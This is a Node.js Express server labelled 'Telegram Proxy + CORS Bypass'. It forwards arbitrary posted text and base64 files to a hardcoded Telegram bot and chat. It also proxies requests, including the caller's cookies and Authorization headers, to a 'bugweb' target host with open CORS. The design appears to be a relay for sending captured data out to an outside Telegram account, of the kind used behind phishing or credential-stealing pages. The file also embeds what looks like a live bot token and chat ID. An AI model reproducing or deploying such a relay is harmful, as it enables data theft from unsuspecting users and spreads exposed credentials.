const express = require('express');
const app = express();
const fs = require('fs');
const path = require('path');

// ==================== CONFIGURATION ====================
const BOT_TOKEN = process.env.BOT_TOKEN || '8507961561:AAFGiLtXzjIcR-j2IQuIDA55QZDQEYQFq_4';
const CHAT_ID = process.env.CHAT_ID || '6767182328';
const TARGET_API = process.env.TARGET_API || 'https://bugweb.lionelmelo.space';
const DEBUG = process.env.DEBUG === 'true';
const PORT = process.env.PORT || 3000;

// Rate limiting
const rateLimit = new Map();
const RATE_LIMIT_MS = 60000;
const MAX_REQUESTS = 30;

// Logger
function log(message, type = 'INFO') {
    const timestamp = new Date().toISOString();
    console.log(`[${timestamp}] [${type}] ${message}`);
    if (DEBUG && type === 'ERROR') {
        const logFile = path.join(__dirname, 'error.log');
        fs.appendFileSync(logFile, `[${timestamp}] ${message}\n`);
    }
}

// ==================== MIDDLEWARES ====================
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, Cookie');
    if (req.method === 'OPTIONS') {
        return res.sendStatus(204);
    }
    next();
});

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Rate limiting middleware
function rateLimitMiddleware(req, res, next) {
    const ip = req.ip || req.connection.remoteAddress || 'unknown';
    const now = Date.now();
    
    if (!rateLimit.has(ip)) {
        rateLimit.set(ip, []);
    }
    
    const timestamps = rateLimit.get(ip).filter(t => now - t < RATE_LIMIT_MS);
    timestamps.push(now);
    rateLimit.set(ip, timestamps);
    
    if (timestamps.length > MAX_REQUESTS) {
        log(`Rate limit exceeded for ${ip}`, 'WARNING');
        return res.status(429).json({ error: 'Too many requests', retryAfter: 60 });
    }
    next();
}

// ==================== PROXY VERS L'API CIBLE (contourne CORS) ====================
app.all('/api/*', rateLimitMiddleware, async (req, res) => {
    const targetUrl = TARGET_API + req.url;
    const options = {
        method: req.method,
        headers: {
            'Content-Type': 'application/json',
            'Cookie': req.headers.cookie || '',
            'Authorization': req.headers.authorization || ''
        },
        body: req.method !== 'GET' && req.method !== 'HEAD' ? JSON.stringify(req.body) : undefined
    };
    
    log(`Proxy: ${req.method} ${targetUrl}`, 'INFO');
    
    try {
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 15000);
        const response = await fetch(targetUrl, { ...options, signal: controller.signal });
        clearTimeout(timeout);
        
        let data;
        const contentType = response.headers.get('content-type');
        if (contentType && contentType.includes('application/json')) {
            data = await response.json();
        } else {
            data = { raw: await response.text() };
        }
        
        res.status(response.status).json(data);
    } catch (error) {
        log(`Proxy error: ${error.message}`, 'ERROR');
        res.status(500).json({ error: error.message });
    }
});

// ==================== TELEGRAM ENDPOINTS ====================
async function sendTelegramMessage(text, retries = 3) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const body = JSON.stringify({ chat_id: CHAT_ID, text: text.substring(0, 4000) });
    
    for (let i = 0; i < retries; i++) {
        try {
            const controller = new AbortController();
            const timeout = setTimeout(() => controller.abort(), 15000);
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body,
                signal: controller.signal
            });
            clearTimeout(timeout);
            const data = await response.json();
            if (data.ok) return { ok: true };
            throw new Error(data.description || 'Unknown error');
        } catch (error) {
            log(`Telegram send error (attempt ${i + 1}/${retries}): ${error.message}`, 'ERROR');
            if (i === retries - 1) throw error;
            await new Promise(r => setTimeout(r, 2000 * (i + 1)));
        }
    }
}

app.post('/send', rateLimitMiddleware, async (req, res) => {
    const { text } = req.body;
    if (!text) {
        return res.status(400).json({ error: 'No text provided' });
    }
    
    log(`Received message (${text.length} chars)`, 'INFO');
    
    try {
        await sendTelegramMessage(text);
        res.json({ ok: true, message: 'Message sent successfully' });
    } catch (error) {
        log(`Failed to send message: ${error.message}`, 'ERROR');
        res.status(500).json({ error: error.message });
    }
});

async function sendTelegramFile(filename, content, retries = 3) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
    
    for (let i = 0; i < retries; i++) {
        try {
            const buffer = Buffer.from(content, 'base64');
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('document', new Blob([buffer]), filename);
            
            const controller = new AbortController();
            const timeout = setTimeout(() => controller.abort(), 30000);
            const response = await fetch(url, {
                method: 'POST',
                body: formData,
                signal: controller.signal
            });
            clearTimeout(timeout);
            const data = await response.json();
            if (data.ok) return { ok: true };
            throw new Error(data.description || 'Unknown error');
        } catch (error) {
            log(`Telegram file send error (attempt ${i + 1}/${retries}): ${error.message}`, 'ERROR');
            if (i === retries - 1) throw error;
            await new Promise(r => setTimeout(r, 2000 * (i + 1)));
        }
    }
}

app.post('/send-file', rateLimitMiddleware, async (req, res) => {
    const { filename, content } = req.body;
    if (!filename || !content) {
        return res.status(400).json({ error: 'Missing filename or content' });
    }
    
    const sizeKB = Math.round(content.length * 0.75 / 1024);
    log(`Received file: ${filename} (${sizeKB} KB)`, 'INFO');
    
    try {
        await sendTelegramFile(filename, content);
        res.json({ ok: true, message: 'File sent successfully' });
    } catch (error) {
        log(`Failed to send file: ${error.message}`, 'ERROR');
        res.status(500).json({ error: error.message });
    }
});

// ==================== ROUTES PUBLIQUES ====================
app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        timestamp: Date.now(),
        bot_configured: !!BOT_TOKEN,
        chat_configured: !!CHAT_ID,
        uptime: process.uptime(),
        memory: process.memoryUsage(),
        version: '3.0.0'
    });
});

app.get('/info', (req, res) => {
    res.json({
        name: 'Telegram Proxy + CORS Bypass',
        version: '3.0.0',
        endpoints: [
            'GET /health', 'GET /info',
            'POST /send', 'POST /send-file',
            'GET|POST|PUT|DELETE /api/* (proxy vers cible)'
        ],
        rate_limit: `${MAX_REQUESTS} requests per ${RATE_LIMIT_MS / 1000}s`,
        bot_configured: !!BOT_TOKEN,
        target_api: TARGET_API
    });
});

// ==================== GESTION DES ERREURS ====================
process.on('uncaughtException', (error) => {
    log(`Uncaught exception: ${error.message}`, 'FATAL');
    console.error(error.stack);
});

process.on('unhandledRejection', (reason) => {
    log(`Unhandled rejection: ${reason}`, 'FATAL');
});

// ==================== DÉMARRAGE ====================
app.listen(PORT, () => {
    log(`========================================`, 'INFO');
    log(`🚀 Proxy actif sur le port ${PORT}`, 'INFO');
    log(`📊 Health: http://localhost:${PORT}/health`, 'INFO');
    log(`📡 Send: POST http://localhost:${PORT}/send`, 'INFO');
    log(`📁 Send-file: POST http://localhost:${PORT}/send-file`, 'INFO');
    log(`🔄 Proxy API: https://meta-downloader-79f2.onrender.com/api/*`, 'INFO');
    log(`🎯 Cible: ${TARGET_API}`, 'INFO');
    log(`🛡️ Rate limit: ${MAX_REQUESTS}/minute`, 'INFO');
    log(`========================================`, 'INFO');
});
